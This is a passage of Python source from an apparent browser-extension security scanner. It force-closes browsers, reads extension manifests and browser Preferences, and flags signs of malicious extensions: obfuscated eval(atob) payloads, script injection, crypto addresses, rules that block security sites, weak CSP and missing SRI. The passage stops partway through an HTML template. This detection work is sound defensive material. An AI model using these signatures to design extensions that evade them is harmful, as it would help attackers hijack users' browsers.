    # Windows: match only the main executable image name (substring matching on full tasklist output
    # causes false positives and "could not close" after a successful taskkill).
    BROWSER_EXE_WINDOWS = {
        "chrome": "chrome.exe",
        "edge": "msedge.exe",
        "brave": "brave.exe",
    }

    def _windows_running_image_names(self) -> Set[str]:
        """Set of lowercased process image names from tasklist (CSV)."""
        import csv
        import io
        names: Set[str] = set()
        try:
            result = subprocess.run(
                ["tasklist", "/FO", "CSV", "/NH"],
                capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
            )
            for row in csv.reader(io.StringIO(result.stdout)):
                if row and row[0].strip():
                    names.add(row[0].strip('"').lower())
        except Exception:
            pass
        return names

    def check_browser_running(self, browser: str) -> bool:
        """Check if browser is currently running"""
        try:
            if self.system == "Windows":
                exe = self.BROWSER_EXE_WINDOWS.get(browser.lower())
                if not exe:
                    return False
                exe_l = exe.lower()
                return exe_l in self._windows_running_image_names()
            else:
                for proc_name in self.BROWSER_PROCESS_NAMES.get(browser, [browser]):
                    result = subprocess.run(
                        ["pgrep", "-f", proc_name], capture_output=True
                    )
                    if result.returncode == 0:
                        return True
        except Exception:
            pass
        
        return False

    def close_browser(self, browser: str) -> bool:
        """Attempt to gracefully close a running browser, then force-kill if needed.
        Returns True if the browser was closed successfully."""
        if not self.check_browser_running(browser):
            return True

        self.log(f"Closing {browser}...")
        try:
            if self.system == "Windows":
                exe = self.BROWSER_EXE_WINDOWS.get(browser.lower())
                if not exe:
                    return False
                subprocess.run(
                    ["taskkill", "/IM", exe, "/T", "/F"],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
                )
            else:
                for proc_name in self.BROWSER_PROCESS_NAMES.get(browser, [browser]):
                    subprocess.run(["pkill", "-f", proc_name], capture_output=True)

            import time
            for _ in range(10):
                time.sleep(0.5)
                if not self.check_browser_running(browser):
                    self.log(f"{browser} closed successfully")
                    return True

            if self.system == "Windows":
                exe = self.BROWSER_EXE_WINDOWS.get(browser.lower())
                if exe:
                    subprocess.run(
                        ["taskkill", "/IM", exe, "/T", "/F"],
                        capture_output=True,
                        creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
                    )
            else:
                for proc_name in self.BROWSER_PROCESS_NAMES.get(browser, [browser]):
                    subprocess.run(["pkill", "-9", "-f", proc_name], capture_output=True)

            import time
            time.sleep(1)
            return not self.check_browser_running(browser)
        except Exception as e:
            self.log(f"Failed to close {browser}: {e}")
            return False

    def parse_chromium_manifest(self, manifest_path: Path) -> Optional[Dict]:
        """Parse a Chromium extension manifest.json"""
        try:
            with open(manifest_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return None
    
    def get_chromium_extensions(self, profile: BrowserProfile) -> List[Extension]:
        """Get all extensions for a Chromium-based browser profile"""
        extensions = []
        extensions_path = profile.path / "Extensions"
        
        if not extensions_path.exists():
            return extensions
        
        for ext_dir in extensions_path.iterdir():
            if not ext_dir.is_dir():
                continue
            
            ext_id = ext_dir.name
            
            # Skip component extensions (internal Chrome extensions)
            if ext_id.startswith('_'):
                continue
            
            # Find the latest version
            versions = [v for v in ext_dir.iterdir() if v.is_dir()]
            if not versions:
                continue
            
            # Sort by version (simple string sort, usually works)
            latest_version = sorted(versions, key=lambda x: x.name)[-1]
            manifest_path = latest_version / "manifest.json"
            
            if not manifest_path.exists():
                continue
            
            manifest = self.parse_chromium_manifest(manifest_path)
            if not manifest:
                continue
            
            # Extract extension info
            name = manifest.get('name', 'Unknown')
            # Handle localized names
            if name.startswith('__MSG_'):
                name = self._get_localized_name(latest_version, manifest) or name
            
            version = manifest.get('version', 'Unknown')
            description = manifest.get('description', '')
            if description.startswith('__MSG_'):
                description = ''
            
            permissions = manifest.get('permissions', [])
            host_permissions = manifest.get('host_permissions', [])
            
            # For MV2 extensions, permissions might contain hosts
            if not host_permissions:
                host_permissions = [p for p in permissions if '://' in p or p == '<all_urls>']
                permissions = [p for p in permissions if '://' not in p and p != '<all_urls>']
            
            content_scripts = []
            for cs in manifest.get('content_scripts', []):
                content_scripts.extend(cs.get('matches', []))
            
            ext = Extension(
                id=ext_id,
                name=name,
                version=version,
                description=description[:100] + '...' if len(description) > 100 else description,
                browser=profile.browser,
                profile=profile.name,
                path=ext_dir,
                permissions=permissions if isinstance(permissions, list) else [permissions],
                host_permissions=host_permissions if isinstance(host_permissions, list) else [host_permissions],
                content_scripts=content_scripts,
                manifest_version=manifest.get('manifest_version', 2),
                is_unpacked=False,  # Will be updated from Preferences
            )
            extensions.append(ext)
        
        # Check Preferences / Secure Preferences for unpacked extensions
        ext_settings = {}
        for prefs_name in ["Preferences", "Secure Preferences"]:
            prefs_path = profile.path / prefs_name
            if prefs_path.exists():
                try:
                    with open(prefs_path, 'r', encoding='utf-8') as f:
                        prefs = json.load(f)
                    settings = prefs.get('extensions', {}).get('settings', {})
                    if settings:
                        ext_settings.update(settings)
                        break
                except Exception:
                    continue
        
        if ext_settings:
            try:
                # Update is_unpacked flag for already-found extensions
                for ext in extensions:
                    ext_info = ext_settings.get(ext.id, {})
                    location = ext_info.get('location', 0)
                    if location in [4, 5]:
                        ext.is_unpacked = True
                    
                    if ext.name.startswith('__MSG_'):
                        cached_name = ext_info.get('manifest', {}).get('name', '')
                        if cached_name:
                            ext.name = cached_name
                
                # Scan for unpacked extensions not already in the Extensions folder
                # location 4 = user-loaded unpacked extension (developer mode)
                # location 5 = Chrome built-in component (skip these)
                for ext_id, ext_info in ext_settings.items():
                    location = ext_info.get('location', 0)
                    if location != 4:
                        continue
                    
                    # Skip if already found
                    if any(e.id == ext_id for e in extensions):
                        continue
                    
                    # Get path - can be absolute or relative to profile
                    ext_path_str = ext_info.get('path', '')
                    if not ext_path_str:
                        continue
                    
                    ext_path = Path(ext_path_str)
                    
                    # If relative, resolve against profile path
                    if not ext_path.is_absolute():
                        ext_path = profile.path / ext_path_str
                    
                    if not ext_path.exists():
                        # Also try under Extensions folder
                        alt_path = profile.path / "Extensions" / ext_path_str
                        if alt_path.exists():
                            ext_path = alt_path
                        else:
                            continue
                    
                    # Find manifest - might be directly here or in a version subfolder
                    manifest_path = ext_path / "manifest.json"
                    manifest = None
                    
                    if manifest_path.exists():
                        manifest = self.parse_chromium_manifest(manifest_path)
                    else:
                        # Check version subfolders
                        for sub in sorted(ext_path.iterdir(), reverse=True):
                            if sub.is_dir() and (sub / "manifest.json").exists():
                                manifest_path = sub / "manifest.json"
                                manifest = self.parse_chromium_manifest(manifest_path)
                                ext_path = sub.parent
                                break
                    
                    if not manifest:
                        continue
                    
                    # Resolve name
                    name = manifest.get('name', ext_id)
                    if name.startswith('__MSG_'):
                        # Try getting from Preferences manifest cache
                        cached_name = ext_info.get('manifest', {}).get('name', '')
                        if cached_name and not cached_name.startswith('__MSG_'):
                            name = cached_name
                        else:
                            # Try _locales
                            for locale in ['en', 'en_US']:
                                msgs_path = manifest_path.parent / '_locales' / locale / 'messages.json'
                                if msgs_path.exists():
                                    try:
                                        with open(msgs_path, 'r', encoding='utf-8') as f:
                                            msgs = json.load(f)
                                        key = name[6:-2]  # Strip __MSG_ and __
                                        if key.lower() in {k.lower(): k for k in msgs}:
                                            real_key = {k.lower(): k for k in msgs}[key.lower()]
                                            name = msgs[real_key].get('message', name)
                                    except Exception:
                                        pass
                                    break
                    
                    permissions = manifest.get('permissions', [])
                    host_permissions = manifest.get('host_permissions', [])
                    
                    ext = Extension(
                        id=ext_id,
                        name=name,
                        version=manifest.get('version', 'Unknown'),
                        description=manifest.get('description', '')[:100],
                        browser=profile.browser,
                        profile=profile.name,
                        path=ext_path,
                        permissions=permissions if isinstance(permissions, list) else [permissions],
                        host_permissions=host_permissions if isinstance(host_permissions, list) else [host_permissions],
                        content_scripts=[],
                        manifest_version=manifest.get('manifest_version', 2),
                        is_unpacked=True,
                    )
                    extensions.append(ext)
                    
            except Exception as e:
                self.log(f"Error reading Preferences for unpacked extensions: {e}")
        
        return extensions
    
    def _get_localized_name(self, ext_path: Path, manifest: Dict) -> Optional[str]:
        """Try to get localized extension name"""
        default_locale = manifest.get('default_locale', 'en')
        
        messages_path = ext_path / "_locales" / default_locale / "messages.json"
        
        # Fallback to English locales if default not found
        if not messages_path.exists():
            for fb in ["en", "en_US", "en_GB"]:
                fallback_path = ext_path / "_locales" / fb / "messages.json"
                if fallback_path.exists():
                    messages_path = fallback_path
                    break
        
        # Ultimate fallback: just pick the first locale folder available
        if not messages_path.exists():
            locales_dir = ext_path / "_locales"
            if locales_dir.exists() and locales_dir.is_dir():
                for sub in locales_dir.iterdir():
                    if (sub / "messages.json").exists():
                        messages_path = sub / "messages.json"
                        break
        
        if messages_path.exists():
            try:
                with open(messages_path, 'r', encoding='utf-8') as f:
                    messages = json.load(f)
                    
                    # Extension i18n keys are case-insensitive
                    name_key = manifest.get('name', '').replace('__MSG_', '').replace('__', '').lower()
                    messages_lower = {k.lower(): v for k, v in messages.items()}
                    
                    if name_key in messages_lower:
                        return messages_lower[name_key].get('message', None)
            except Exception:
                pass
        
        return None
    
    def analyze_extension_heuristics(self, ext: Extension):
        """Analyze downloaded/installed extension code for known bad patterns"""
        target_dir = ext.path
        if not getattr(target_dir, 'exists', lambda: False)():
            return
            
        versions = [v for v in target_dir.iterdir() if v.is_dir() and v.name and v.name[0].isdigit()]
        if versions:
            target_dir = sorted(versions, key=lambda x: x.name)[-1]
            
        TRUSTED_DEFAULT_EXTENSIONS = {
            "nmmhkkegccagdldgiimedpiccmgmieda": "Google Chrome Web Store Payments",
            "ghbmnnjooekpmoecnnnilnnbdlolhkhi": "Google Docs Offline",
            "jmjflgjpcpepeafmmgdpfkogkghcpiha": "Microsoft Edge Default Components"
        }
        
        is_trusted = ext.id in TRUSTED_DEFAULT_EXTENSIONS
        if is_trusted:
            ext.trusted_label = f"TRUSTED DEFAULT: {TRUSTED_DEFAULT_EXTENSIONS[ext.id]}"
            if ext.name.startswith('__MSG_'):
                ext.name = TRUSTED_DEFAULT_EXTENSIONS[ext.id]
            
        manifest_path = target_dir / "manifest.json"
        if manifest_path.exists() and not is_trusted:
            try:
                manifest = self.parse_chromium_manifest(manifest_path)
                if manifest:
                    # --- DNR analysis ---
                    dnr = manifest.get('declarative_net_request', {})
                    rulesets = dnr.get('rule_resources', [])
                    for rs in rulesets:
                        rs_path = target_dir / rs.get('path', '')
                        if rs_path.exists():
                            with open(rs_path, 'r', encoding='utf-8') as f:
                                rules = json.load(f)
                            for r in rules:
                                if r.get('action', {}).get('type') in ['block', 'redirect']:
                                    cond = r.get('condition', {})
                                    url_filt = cond.get('urlFilter', '')
                                    if url_filt and any(k in url_filt.lower() for k in ['google', 'bing', 'yahoo', 'antivirus', 'malwarebytes', 'microsoft']):
                                        ext.dnr_warnings.append(f"Blocks/Redirects Search/Security: {url_filt}")

                    # --- CSP analysis ---
                    mv = manifest.get('manifest_version', 2)
                    csp_strings = []
                    raw_csp = manifest.get('content_security_policy')
                    if isinstance(raw_csp, str):
                        csp_strings.append(raw_csp)
                    elif isinstance(raw_csp, dict):
                        for key in ('extension_pages', 'sandbox'):
                            val = raw_csp.get(key, '')
                            if isinstance(val, str) and val:
                                csp_strings.append(val)

                    ext.csp_raw = "; ".join(csp_strings) if csp_strings else ""

                    if not csp_strings and mv <= 2:
                        ext.csp_issues.append("No CSP defined (MV2) — browser applies a default but the extension should declare one explicitly")

                    _SAFE_INTERNAL_PREFIXES = ("'self'", "'none'", "'wasm-unsafe-eval'", "blob:", "data:", "chrome-extension://")
                    for csp in csp_strings:
                        directives = {}
                        for part in csp.split(';'):
                            part = part.strip()
                            if not part:
                                continue
                            tokens = part.split()
                            if tokens:
                                directives[tokens[0].lower()] = [t.lower() for t in tokens[1:]]

                        for dname in ('script-src', 'default-src'):
                            sources = directives.get(dname, [])
                            if "'unsafe-eval'" in sources:
                                ext.csp_issues.append(f"CSP {dname} allows 'unsafe-eval' — permits eval()/new Function() which enables code injection")
                            if "'unsafe-inline'" in sources:
                                ext.csp_issues.append(f"CSP {dname} allows 'unsafe-inline' — permits inline script blocks and event handlers")
                            for src in sources:
                                if src == '*':
                                    ext.csp_issues.append(f"CSP {dname} has wildcard source '*' — any origin can serve scripts")
                                    break
                            for src in sources:
                                if src.startswith('http:'):
                                    ext.csp_issues.append(f"CSP {dname} allows http: source ({src}) — scripts loaded over insecure connection")
                                    break
                            external_domains = [s for s in sources
                                                if s not in ("'unsafe-eval'", "'unsafe-inline'", "'self'", "'none'", '*', "'wasm-unsafe-eval'")
                                                and not s.startswith("'nonce-") and not s.startswith("'sha")
                                                and not any(s.startswith(pfx) for pfx in _SAFE_INTERNAL_PREFIXES)
                                                and ('.' in s or ':' in s)]
                            if external_domains:
                                ext.csp_issues.append(f"CSP {dname} loads scripts from external domains: {', '.join(external_domains[:5])}")
            except Exception:
                pass

        domain_pattern = re.compile(r'https?://(?:www\.)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,8})')
        # Match IPs in URL/network contexts, NOT bare version-like numbers
        raw_ip_pattern = re.compile(r'(?:https?://|["\'/=@])(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:[:/\s"\',;)\]#?]|$)')
        noise_ips = {"0.0.0.0", "127.0.0.1", "255.255.255.255", "255.255.255.0"}

        def _is_valid_ip(ip_str):
            """Reject version numbers and invalid IPs."""
            parts = ip_str.split('.')
            if len(parts) != 4:
                return False
            for p in parts:
                if not p.isdigit():
                    return False
                val = int(p)
                if val > 254 or (len(p) > 1 and p[0] == '0'):
                    return False
            if int(parts[0]) == 0:
                return False
            return True

        for js_file in target_dir.rglob("*.js"):
            try:
                with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read(1024 * 1024 * 1)
                
                # Domain & IP extraction
                domains_found = set(domain_pattern.findall(content))
                ips_found = {ip for ip in raw_ip_pattern.findall(content)
                             if _is_valid_ip(ip) and ip not in noise_ips}
                for d in domains_found | ips_found:
                    if d in ["w3.org", "schema.org", "github.com", "chromium.org"]:
                        continue
                    if d not in ext.extracted_domains:
                        ext.extracted_domains[d] = []
                    if js_file.name not in ext.extracted_domains[d]:
                        ext.extracted_domains[d].append(js_file.name)
                
                # Base64 Domain Extraction (Hidden IOCs)
                import base64
                import binascii
                # Match long Base64 strings that could reasonably contain a URL/Host
                b64_pattern = re.compile(r'(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?')
                for b64str in set(b64_pattern.findall(content)):
                    try:
                        decoded = base64.b64decode(b64str).decode('utf-8', errors='ignore')
                        domains_hidden = set(domain_pattern.findall(decoded))
                        ips_hidden = {ip for ip in raw_ip_pattern.findall(decoded)
                                      if _is_valid_ip(ip) and ip not in noise_ips}
                        for hd in domains_hidden | ips_hidden:
                            if hd in ["w3.org", "schema.org", "github.com", "chromium.org"]:
                                continue
                            if hd not in ext.extracted_domains:
                                ext.extracted_domains[hd] = []
                            lbl = f"{js_file.name} (Base64 Decoded)"
                            if lbl not in ext.extracted_domains[hd]:
                                ext.extracted_domains[hd].append(lbl)
                    except binascii.Error:
                        pass
                
                if not is_trusted:
                    if 'eval(' in content and 'atob(' in content:
                        ext.heuristics.append(f"{js_file.name}: Potential obfuscated eval(atob(...)) payload")
                        
                    if 'document.createElement("script")' in content or "document.createElement('script')" in content:
                        ext.heuristics.append(f"{js_file.name}: Dynamic script injection detected")
                        
                    if re.search(r'0x[a-fA-F0-9]{40}', content):
                        ext.heuristics.append(f"{js_file.name}: Hardcoded Ethereum/crypto address pattern found")
                        
            except Exception:
                pass

        # Obfuscation detection
        for js_file in target_dir.rglob("*.js"):
            try:
                with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read(1024 * 1024)
                
                obf_reasons = []
                # Check for common bundlers which minify code into long lines
                bundler_signatures = ['webpackBootstrap', 'parcelRequire', 'define.amd', 'requirejs', '__webpack_require__']
                is_bundled = any(sig in content[:5000] for sig in bundler_signatures)
                
                # Long lines check (minified/obfuscated)
                lines = content.split('\n')
                long_lines = sum(1 for l in lines if len(l) > 5000)
                if long_lines > 0 and len(lines) < 10:
                    if not is_bundled:
                        obf_reasons.append("single-line minified")
                
                # eval / Function constructor
                eval_count = content.count('eval(') + content.count('new Function(') + content.count('Function(')
                if eval_count >= 3:
                    obf_reasons.append(f"{eval_count}x eval/Function calls")
                
                # Hex/unicode escape density
                hex_matches = len(re.findall(r'\\x[0-9a-fA-F]{2}', content))
                unicode_matches = len(re.findall(r'\\u[0-9a-fA-F]{4}', content))
                escape_density = (hex_matches + unicode_matches) / max(1, len(content)) * 100
                if escape_density > 5:
                    obf_reasons.append(f"high escape density ({escape_density:.1f}%)")
                
                # Large base64 blobs
                b64_matches = re.findall(r'[A-Za-z0-9+/=]{200,}', content)
                if len(b64_matches) > 2:
                    obf_reasons.append(f"{len(b64_matches)} base64 blobs")
                
                # Only flag if there are multiple reasons, OR a single extreme reason
                is_obfuscated = False
                if len(obf_reasons) >= 2:
                    is_obfuscated = True
                elif escape_density > 15.0:
                    is_obfuscated = True
                elif len(b64_matches) > 5:
                    is_obfuscated = True
                elif not is_bundled and eval_count >= 10:
                    is_obfuscated = True

                if is_obfuscated and obf_reasons:
                    rel = str(js_file.relative_to(target_dir)).replace('\\', '/')
                    ext.obfuscated_files.append(f"{rel}: {', '.join(obf_reasons)}")
            except Exception:
                pass

        # SRI check — external resources loaded without integrity hash
        _CDN_DOMAINS = ('cdn.jsdelivr.net', 'cdnjs.cloudflare.com', 'unpkg.com',
                        'ajax.googleapis.com', 'code.jquery.com', 'stackpath.bootstrapcdn.com',
                        'maxcdn.bootstrapcdn.com', 'cdn.datatables.net', 'cdn.bootcss.com')
        if not is_trusted:
            _sri_script_re = re.compile(r'<script\b[^>]*\bsrc\s*=\s*["\']?(https?://[^"\'>\s]+)', re.IGNORECASE)
            _sri_link_re = re.compile(r'<link\b[^>]*\bhref\s*=\s*["\']?(https?://[^"\'>\s]+)', re.IGNORECASE)
            _sri_integrity_re = re.compile(r'\bintegrity\s*=', re.IGNORECASE)

            for html_file in list(target_dir.rglob("*.html")) + list(target_dir.rglob("*.htm")):
                try:
                    with open(html_file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read(512 * 1024)
                    rel_path = str(html_file.relative_to(target_dir)).replace('\\', '/')
                    for tag_match in re.finditer(r'<(?:script|link)\b[^>]*>', content, re.IGNORECASE):
                        tag = tag_match.group(0)
                        src_m = _sri_script_re.match(tag) or _sri_link_re.match(tag)
                        if not src_m:
                            continue
                        url = src_m.group(1)
                        if not _sri_integrity_re.search(tag):
                            tag_type = "script" if "<script" in tag.lower() else "stylesheet"
                            ext.sri_issues.append({"file": rel_path, "url": url, "type": tag_type})
                except Exception:
                    pass

            # JS files: fetch/XMLHttpRequest to known CDN domains without SRI
            _cdn_fetch_re = re.compile(
                r'(?:fetch|\.src\s*=|XMLHttpRequest.*?open\s*\([^,]*,)\s*["\']'
                r'(https?://(?:' + '|'.join(re.escape(d) for d in _CDN_DOMAINS) + r')[^"\']*)["\']',
                re.IGNORECASE
            )
            for js_file in target_dir.rglob("*.js"):
                try:
                    with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read(1024 * 1024)
                    rel_path = str(js_file.relative_to(target_dir)).replace('\\', '/')
                    for m in _cdn_fetch_re.finditer(content):
                        ext.sri_issues.append({"file": rel_path, "url": m.group(1), "type": "js_fetch"})
                except Exception:
                    pass

        # Calculate risk score after all analysis
        ext.calculate_risk_score()

    def scan_extensions(self, browsers: List[str] = None) -> List[Extension]:
        """Scan all supported browsers (Chrome, Edge, Brave) for installed extensions"""
        self.extensions_cache = []
        browser_paths = self.get_browser_paths()
        
        if browsers:
            browser_paths = {k: v for k, v in browser_paths.items() if k in browsers}
        
        for browser, paths in browser_paths.items():
            for browser_path in paths:
                profiles = self.get_profiles(browser_path, browser)
                
                for profile in profiles:
                    exts = self.get_chromium_extensions(profile)
                    self.extensions_cache.extend(exts)
        
        for ext in self.extensions_cache:
            self.analyze_extension_heuristics(ext)

        self._apply_cached_webstore_meta()
            
        return self.extensions_cache

    def _apply_cached_webstore_meta(self) -> None:
        """Re-attach Chrome Web Store metadata after a rescan (scan_extensions clears the cache)."""
        for ext in self.extensions_cache:
            cached = self._webstore_meta_by_id.get(ext.id)
            if cached:
                ext.webstore_meta = dict(cached)

    def scan_extension_from_path(self, ext_path: str) -> Extension:
        """Analyze an extension from any local directory (downloaded, extracted, etc.)"""
        original_path = Path(ext_path).resolve()
        if not original_path.exists() or not original_path.is_dir():
            raise FileNotFoundError(f"Extension directory not found: {original_path}")

        scan_dir = original_path
        manifest_path = scan_dir / "manifest.json"
        has_version_subdirs = False

        if not manifest_path.exists():
            versions = [v for v in scan_dir.iterdir() if v.is_dir() and v.name and v.name[0].isdigit()]
            if versions:
                has_version_subdirs = True
                scan_dir = sorted(versions, key=lambda x: x.name)[-1]
                manifest_path = scan_dir / "manifest.json"

        if not manifest_path.exists():
            raise FileNotFoundError(f"No manifest.json found in {original_path}")

        manifest = self.parse_chromium_manifest(manifest_path)
        if not manifest:
            raise ValueError(f"Could not parse manifest.json in {scan_dir}")

        name = manifest.get('name', original_path.name or 'Unknown')
        if name.startswith('__MSG_'):
            name = self._get_localized_name(scan_dir, manifest) or name

        version = manifest.get('version', 'Unknown')
        description = manifest.get('description', '')
        if description.startswith('__MSG_'):
            description = ''

        permissions = [p for p in manifest.get('permissions', []) if isinstance(p, str)]
        host_permissions = [p for p in manifest.get('host_permissions', []) if isinstance(p, str)]

        if not host_permissions:
            host_permissions = [p for p in permissions if '://' in p or p == '<all_urls>']
            permissions = [p for p in permissions if '://' not in p and p != '<all_urls>']

        content_scripts = []
        for cs in manifest.get('content_scripts', []):
            content_scripts.extend(cs.get('matches', []))

        ext_id = original_path.name

        ext = Extension(
            id=ext_id,
            name=name,
            version=version,
            description=description[:200] + '...' if len(description) > 200 else description,
            browser="local",
            profile="on-demand scan",
            path=original_path,
            permissions=permissions,
            host_permissions=host_permissions,
            content_scripts=content_scripts,
            manifest_version=manifest.get('manifest_version', 2),
            is_unpacked=True,
        )
        self.analyze_extension_heuristics(ext)
        return ext

    def generate_extension_graph(self, ext: Extension, filepath: str, include_source: bool = False) -> bool:
        """Generate an interactive HTML graph showing extension file→domain→permission relationships"""
        try:
            target_dir = ext.path
            if not target_dir.exists():
                return False
            versions = [v for v in target_dir.iterdir() if v.is_dir() and v.name and v.name[0].isdigit()]
            if versions:
                target_dir = sorted(versions, key=lambda x: x.name)[-1]

            domain_pattern = re.compile(r'https?://(?:www\.)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,8})')
            raw_ip_pattern = re.compile(r'(?:https?://|["\'/=@])(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:[:/\s"\',;)\]#?]|$)')
            noise_domains = {"w3.org", "schema.org", "github.com", "chromium.org",
                             "googleapis.com", "gstatic.com", "google.com"}
            noise_ips = {"0.0.0.0", "127.0.0.1", "255.255.255.255", "255.255.255.0"}

            def _is_valid_ip(ip_str):
                parts = ip_str.split('.')
                if len(parts) != 4:
                    return False
                for p in parts:
                    if not p.isdigit():
                        return False
                    val = int(p)
                    if val > 254 or (len(p) > 1 and p[0] == '0'):
                        return False
                if int(parts[0]) == 0:
                    return False
                return True

            files_data = {}  # filename -> {domains, size, type}
            all_domains = set()
            file_imports = {}  # filename -> list of filenames it references
            file_contents = {}  # rel -> content (for cross-ref detection)
            referenceable = {}  # basename -> rel path (for linkable file types)

            for f in target_dir.rglob("*"):
                if not f.is_file():
                    continue
                rel = str(f.relative_to(target_dir)).replace("\\", "/")
                suffix = f.suffix.lower()
                if suffix in ('.js', '.jsx', '.ts', '.tsx', '.mjs'):
                    ftype = "script"
                elif suffix in ('.html', '.htm'):
                    ftype = "html"
                elif suffix in ('.css',):
                    ftype = "style"
                elif suffix == '.json':
                    ftype = "data"
                elif suffix in ('.png', '.jpg', '.gif', '.svg', '.ico', '.webp',
                                '.woff', '.woff2', '.ttf', '.eot', '.map'):
                    continue
                else:
                    continue

                try:
                    content = f.read_text(encoding='utf-8', errors='ignore')[:512_000]
                except Exception:
                    continue

                domains = set(domain_pattern.findall(content)) - noise_domains
                ips = {ip for ip in raw_ip_pattern.findall(content)
                       if _is_valid_ip(ip) and ip not in noise_ips}
                domains.update(ips)
                all_domains.update(domains)
                files_data[rel] = {"domains": list(domains), "size": f.stat().st_size, "type": ftype}
                file_contents[rel] = content
                if suffix in ('.js', '.html', '.css', '.json'):
                    referenceable[f.name] = rel

            # Cross-reference detection (single pass per file)
            for rel, content in file_contents.items():
                refs = []
                for basename, ref_rel in referenceable.items():
                    if ref_rel != rel and basename in content:
                        refs.append(ref_rel)
                if refs:
                    file_imports[rel] = refs

            # Build nodes and links for the graph
            nodes = []
            links = []
            node_ids = {}
            idx = 0

            for fname, info in files_data.items():
                node_ids[f"file:{fname}"] = idx
                nodes.append({"id": idx, "label": fname, "group": info["type"],
                              "size": max(4, min(20, info["size"] // 1000))})
                idx += 1

            for dom in sorted(all_domains):
                node_ids[f"domain:{dom}"] = idx
                nodes.append({"id": idx, "label": dom, "group": "domain", "size": 8})
                idx += 1

            perm_groups = {}
            for p in ext.permissions:
                if not isinstance(p, str):
                    continue
                info = PERMISSIONS_DICTIONARY.get(p, {})
                risk = info.get("risk_level", "LOW")
                perm_groups[p] = risk
            for p in ext.host_permissions:
                if not isinstance(p, str):
                    continue
                perm_groups[p] = "HOST"

            for perm, risk in perm_groups.items():
                node_ids[f"perm:{perm}"] = idx
                nodes.append({"id": idx, "label": perm, "group": f"perm_{risk.lower()}", "size": 6})
                idx += 1

            for fname, info in files_data.items():
                src = node_ids[f"file:{fname}"]
                for dom in info["domains"]:
                    if f"domain:{dom}" in node_ids:
                        links.append({"source": src, "target": node_ids[f"domain:{dom}"], "type": "contacts"})

            for fname, refs in file_imports.items():
                src = node_ids.get(f"file:{fname}")
                if src is None:
                    continue
                for ref in refs:
                    tgt = node_ids.get(f"file:{ref}")
                    if tgt is not None:
                        links.append({"source": src, "target": tgt, "type": "imports"})

            nodes_json = json.dumps(nodes)
            links_json = json.dumps(links)
            ext_name_safe = ext.name.replace("'", "\\'").replace('"', '\\"')
            perms_json = json.dumps(list(perm_groups.keys()))
            host_perms_json = json.dumps([p for p in ext.host_permissions if isinstance(p, str)])
            file_domains_json = json.dumps({k: v["domains"] for k, v in files_data.items()})
            obfuscated_set = set()
            for ofentry in ext.obfuscated_files:
                obfuscated_set.add(ofentry.split(':')[0].strip())
            obfuscated_json = json.dumps(list(obfuscated_set))

            # Risk score badge
            rs = ext.risk_score
            if rs >= 76:
                risk_color = "#ef5350"
                risk_label = "CRITICAL"
            elif rs >= 51:
                risk_color = "#ff9800"
                risk_label = "HIGH"
            elif rs >= 26:
                risk_color = "#ffc107"
                risk_label = "MEDIUM"
            else:
                risk_color = "#4caf50"
                risk_label = "LOW"

            file_contents_json = "{}"
            if include_source:
                safe_contents = {}
                for rel, text in file_contents.items():
                    safe_contents[rel] = str(text[:100000]).replace("</script>", "<\\/script>") if text else ""
                file_contents_json = json.dumps(safe_contents)

            perms_dict = {}
            for perm in ext.permissions + ext.host_permissions:
                if isinstance(perm, str) and perm in PERMISSIONS_DICTIONARY:
                    perms_dict[perm] = PERMISSIONS_DICTIONARY[perm]
            perms_dict_json = json.dumps(perms_dict)

            html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Extension Map: {ext_name_safe}</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://unpkg.com/vis-network/standalone/umd/vis-network.min.js"></script>
    <style>
        body {{ margin: 0; padding: 0; font-family: 'Outfit', sans-serif; background: radial-gradient(circle at center, #1a1d2e 0%, #0f111a 100%); color: #ffffff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }}
        .glass {{ background: rgba(25, 29, 46, 0.6); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3); }}
        #sidebar {{ position: fixed; top: 0; right: -450px; width: 400px; height: 100vh; background: rgba(11, 12, 16, 0.95); border-left: 1px solid rgba(255,255,255,0.1); padding: 24px; box-sizing: border-box; transition: right 0.3s cubic-bezier(0.4, 0, 0.2, 1); overflow-y: auto; z-index: 100; backdrop-filter: blur(10px); color: #cbd5e1; box-shadow: -10px 0 30px rgba(0,0,0,0.5); }}
        #sidebar.active {{ right: 0; }}
        .close-btn {{ position: absolute; top: 16px; right: 20px; font-size: 20px; color: #8fa0c1; cursor: pointer; transition: color 0.2s; }}
        .close-btn:hover {{ color: #fff; }}
        #left-sidebar {{ position: fixed; top: 0; left: -400px; width: 350px; height: 100vh; background: rgba(11, 12, 16, 0.95); border-right: 1px solid rgba(255,255,255,0.1); padding: 24px; box-sizing: border-box; transition: left 0.3s cubic-bezier(0.4, 0, 0.2, 1); overflow-y: auto; z-index: 100; backdrop-filter: blur(10px); color: #cbd5e1; box-shadow: 10px 0 30px rgba(0,0,0,0.5); }}
        #left-sidebar.active {{ left: 0; }}
        .close-btn-left {{ position: absolute; top: 16px; right: 20px; font-size: 20px; color: #8fa0c1; cursor: pointer; transition: color 0.2s; }}
        .close-btn-left:hover {{ color: #fff; }}
